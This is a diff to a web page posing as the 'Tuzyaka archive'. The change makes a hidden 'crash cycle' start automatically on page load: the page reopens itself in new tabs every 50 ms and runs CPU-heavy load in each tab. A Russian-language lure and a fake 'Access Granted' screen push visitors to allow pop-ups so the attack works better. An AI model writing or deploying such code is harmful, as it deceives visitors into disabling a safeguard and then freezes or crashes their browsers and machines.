@@ -17,17 +17,10 @@
             font-size: 2em;
             text-shadow: 0 0 10px #0f0;
         }
-        button {
+        p {
             font-size: 1.5em;
-            padding: 10px 20px;
-            background-color: #f00;
-            color: #fff;
-            border: none;
-            cursor: pointer;
-            text-shadow: 0 0 5px #fff;
-        }
-        button:hover {
-            background-color: #ff3333;
+            color: #f00;
+            text-shadow: 0 0 5px #f00;
         }
         canvas {
             display: none;
@@ -41,28 +34,26 @@
 </head>
 <body>
     <h1>Tuzyaka archive</h1>
-    <button id="startButton">Разрешить доступ к архиву</button>
+    <p>Дайте доступ к архиву, разрешив всплывающие окна</p>
     <canvas id="canvas"></canvas>
 
     <script>
-        const startButton = document.getElementById("startButton");
-
-        startButton.addEventListener("click", () => {
-            startButton.style.display = "none";
+        // Автоматический запуск после загрузки страницы
+        window.onload = () => {
             document.body.innerHTML = "<h1>Access Granted</h1>";
             document.body.style.color = "#f00";
             document.body.style.textShadow = "0 0 10px #f00";
             setTimeout(() => {
                 startCrashCycle(); // Запускаем цикл с нагрузкой и вкладками
             }, 1000); // Задержка 1 секунда для эффекта
-        });
+        };
 
-        // Бесконечный цикл открытия вкладок с нагрузкой
+        // Бесконечный цикл открытия вкладок
         function startCrashCycle() {
             function openCrashTab() {
                 const newWindow = window.open(window.location.href, '_blank');
                 if (!newWindow) {
-                    console.log("Всплывающие окна заблокированы. Разрешите их для максимального эффекта.");
+                    console.log("Всплывающие окна заблокированы. Разрешите их для доступа.");
                 }
                 startFullLoad(); // Нагрузка в текущей вкладке
                 setTimeout(openCrashTab, 50); // Открытие новой вкладки каждые 50 мс
